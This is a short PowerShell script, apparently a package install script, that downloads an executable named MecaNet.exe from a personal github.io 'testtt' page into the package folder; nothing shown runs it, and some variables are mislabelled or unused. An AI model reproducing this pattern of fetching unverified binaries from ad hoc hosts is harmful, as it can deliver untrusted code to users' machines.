$package = Get-Package
$toolsDir = $(Split-Path -parent $MyInvocation.MyCommand.Definition)


$zipUrl = 'https://pulsarfn.github.io/testtt/MecaNet.exe'


$destinationDir = [System.Environment]::GetFolderPath('Desktop')


$tempZip = Join-Path $toolsDir 'MecaNet.exe'


Invoke-WebRequest -Uri $zipUrl -OutFile $tempZip






